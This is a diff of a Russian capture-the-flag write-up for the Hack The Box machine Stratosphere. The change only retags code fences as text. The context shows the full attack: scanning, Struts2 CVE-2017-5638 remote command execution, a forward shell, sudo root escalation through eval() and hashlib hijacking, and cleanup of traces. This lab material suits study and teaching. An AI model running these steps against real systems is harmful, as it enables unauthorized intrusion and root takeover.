@@ -21,7 +21,7 @@ comments: true
 
 # nmap
 Fire up NMAP! Для начала аккуратно:
-```
+```text
 root@kali:~# nmap -n -vvv -sS -Pn -oA nmap/initial 10.10.10.64
 Nmap scan report for 10.10.10.64
 Host is up, received user-set (0.061s latency).
@@ -38,7 +38,7 @@ Read data files from: /usr/bin/../share/nmap
 ```
 
 Не долго думая, более требовательно:
-```
+```text
 root@kali:~# nmap -n -vvv -sS -sV -sC -oA nmap/version -p22,80,8080 10.10.10.64
 Nmap scan report for 10.10.10.64
 Host is up, received echo-reply ttl 63 (0.061s latency).
@@ -299,7 +299,7 @@ SSH, web-сервис на 80-м, прокся на 8080-м и два отпеч
 Неважно, что ты выберешь — многопоточные `dirbuster` и `gobuster` или минималистичный `dirb` — все они по-своему хороши, я люблю чередовать :grin:
 
 Сегодня воспользуемся gobuster'ом:
-```
+```text
 root@kali:~# gobuster -u 'http://10.10.10.64' -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e -o gobuster/stratosphere.gobuster
 =====================================================
 Gobuster v2.0.0              OJ Reeves (@TheColonial)
@@ -369,7 +369,7 @@ Shellcodes: No Result
 Похоже, `exploits/linux/webapps/41570.py` — именно то, что нам нужно. Этот скрипт представляет PoC уязвимости [CVE-2017-5638](https://nvd.nist.gov/vuln/detail/CVE-2017-5638 "NVD - CVE-2017-5638"), имеющей максимальный рейтинг опасности (10.0) и заключающейся в некорректной обработке исключений, вследствие которой аттакующий получает возможность выполнения произвольных команд на сервере.
 
 Что ж, попробуем эксплоит в действии:
-```
+```text
 root@kali:~# python /usr/share/exploitdb/exploits/linux/webapps/41570.py http://10.10.10.64/Monitoring/example/Welcome.action id
 [*] CVE: 2017-5638 - Apache Struts2 S2-045
 [*] cmd: id
@@ -488,7 +488,7 @@ while True:
 Подробнее об этом способе можно узнать из [этого](https://www.youtube.com/watch?v=k6ri-LFWEj4 "VulnHub - Sokar - YouTube") туториала (0:15:36-0:39:10) прохождения машины с VulnHub'а. От себя добавлю, что в нашем случае представляется невозможным использование библиотеки `requests` для Python в силу особенностей используемой уязвимости: `requests` не умеет по-человечески работать с возвращаемым уязвимым сервером **IncompleteRead**, возбуждая исключение `requests.exceptions.ChunkedEncodingError`; если же использовать встроенные средства языка, то этот же ответ с IncompleteRead без проблем перехватывается исключением `http.client.IncompleteRead` и далее успешно обрабатывается как `e.partial`. Подробнее об этой проблеме [здесь](https://github.com/mazen160/struts-pwn/issues/8 "Issue with requests partial read · Issue #8 · mazen160/struts-pwn").
 
 Итак, время полевых испытаний:
-```
+```text
 root@kali:~# python3 StratosphereFwdShell.py
 [*] Session ID: 42942
 [*] Setting up fifo shell on target
@@ -619,7 +619,7 @@ drwxr-xr-x 2 richard richard 4096 Oct 18  2017 Desktop
 
 ## user.txt
 Заберем флаг пользователя:
-```
+```text
 richard@stratosphere:~$ cat /home/richard/user.txt
 e610b298????????????????????????
 ```
@@ -670,7 +670,7 @@ question()
 
 ## PrivEsc: richard → root. Способ 1
 Первое, что бросается в глаза, так это то, что шебанг привязан к `python3`. К тому же, если сорвать покровы софт линка:
-```
+```text
 richard@stratosphere:~$ ls -l /usr/bin/python
 lrwxrwxrwx 1 root root 16 Feb 11  2018 /usr/bin/python -> /usr/bin/python3
 ```
@@ -686,7 +686,7 @@ User richard may run the following commands on stratosphere:
 ```
 
 `/usr/bin/python*`??? What's that wildcard `*`?? Это фейл, ребят. Смотрим на доступные питоны в системы:
-```
+```text
 richard@stratosphere:~$ ls -l /usr/bin/python*
 lrwxrwxrwx 1 root root      16 Feb 11  2018 /usr/bin/python -> /usr/bin/python3
 lrwxrwxrwx 1 root root       9 Jan 24  2017 /usr/bin/python2 -> python2.7
@@ -701,7 +701,7 @@ lrwxrwxrwx 1 root root      10 Jan 20  2017 /usr/bin/python3m -> python3.5m
 
 ### root.txt
 В [этом](https://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html "Vipul Chaskar's Blog: Exploiting eval() function in Python") посте хорошо описан механизм эксплуатации функции `eval()` для Пайтона, а я же просто ~~поимею~~ получу root-сессию:
-```
+```text
 richard@stratosphere:~$ sudo /usr/bin/python2 ~/test.py
 Solve: 5af003e100c80923ec04d65933d382cb
 __import__('os').system('/bin/bash')
@@ -714,7 +714,7 @@ d41d8cd9????????????????????????
 ```
 
 Кстати, уже сейчас можно разоблачить негодяев, удостоверившись в том, что обещанного `/root/success.py` не существует:
-```
+```text
 root@stratosphere:/home/richard# ls /root/success.py
 ls: cannot access '/root/success.py': No such file or directory
 ```
@@ -725,7 +725,7 @@ ls: cannot access '/root/success.py': No such file or directory
 В начале исходника нельзя не заметить импорт библиотеки `hashlib` для вычисления хеш-значений вводимых строк. Угоним же эту библиотеку?
 
 Для этого нам необходимо узнать порядок резолва путей, по которым будет производиться импорт модулей. Сделать это можно такой командой:
-```
+```text
 richard@stratosphere:~$ python -c 'import sys; print(sys.path)'
 ['', '/usr/lib/python35.zip', '/usr/lib/python3.5', '/usr/lib/python3.5/plat-x86_64-linux-gnu', '/usr/lib/python3.5/lib-dynload', '/usr/local/lib/python3.5/dist-packages', '/usr/lib/python3/dist-packages']
 ```
@@ -743,7 +743,7 @@ richard@stratosphere:~$ ls -l *.py
 
 ### root.txt
 И со спокойной совестью запустим скрипт:
-```
+```text
 richard@stratosphere:~$ sudo /usr/bin/python ~/test.py
 d41d8cd9????????????????????????
 Solve: 5af003e100c80923ec04d65933d382cb
@@ -751,7 +751,7 @@ Solve: 5af003e100c80923ec04d65933d382cb
 ```
 
 Чистим следы пребывания в системе and we're done with this box:
-```
+```text
 richard@stratosphere:~$ rm hashlib.py
 richard@stratosphere:~$ rm /dev/shm/input* /dev/shm/output*
 ```
@@ -759,7 +759,7 @@ richard@stratosphere:~$ rm /dev/shm/input* /dev/shm/output*
 # Разное
 ## Хеши
 Шутки ради попрошу своего друга Джона решить предлагаемые тестом хеши:
-```
+```text
 root@kali:~# echo '5af003e100c80923ec04d65933d382cb' > strat.md5
 root@kali:~# echo 'd24f6fb449855ff42344feff18ee2819033529ff' > strat.sha1
 root@kali:~# echo '91ae5fc9ecbca9d346225063f23d2bd9' > strat.md4
